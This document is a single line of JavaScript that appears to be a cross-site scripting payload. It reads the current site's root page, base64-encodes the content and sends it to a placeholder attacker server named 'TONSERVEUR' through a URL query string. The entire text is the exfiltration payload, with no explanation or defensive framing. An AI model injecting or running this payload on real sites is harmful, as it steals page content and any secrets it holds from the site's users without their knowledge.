fetch('/').then(r => r.text()).then(d => fetch('http://TONSERVEUR/xss?data=' + btoa(d)))
